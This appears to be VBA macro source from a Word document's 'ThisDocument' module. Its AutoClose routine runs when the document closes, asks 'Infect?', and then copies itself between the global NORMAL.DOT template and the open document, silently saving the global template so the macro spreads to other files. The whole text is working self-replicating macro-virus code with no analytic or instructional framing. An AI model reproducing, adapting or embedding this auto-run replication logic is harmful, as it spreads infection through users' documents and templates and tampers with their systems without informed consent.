   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "AutoClose"

   Public Sub MAIN()
   Dim Answer
   Dim Where$
   On Error GoTo -1: On Error GoTo Abort

   Answer = WordBasic.MsgBox("Infect?", 36)

   If Answer = -1 Then

   Where$ = UCase(WordBasic.[Right$](WordBasic.[MacroFileName$](WordBasic.[MacroName$](0)), 10))

       If Where$ = "NORMAL.DOT" Then
           WordBasic.MacroCopy "Global:autoClose", WordBasic.[FileName$]() + ":AutoClose"
           WordBasic.FileSaveAs Name:=WordBasic.[FileName$](), Format:=1
       Else
           WordBasic.MacroCopy WordBasic.[FileName$]() + ":autoClose", "Global:AutoClose"
           WordBasic.ToolsOptionsSave GlobalDotPrompt:=0
       End If

   End If

   Abort:
   End Sub
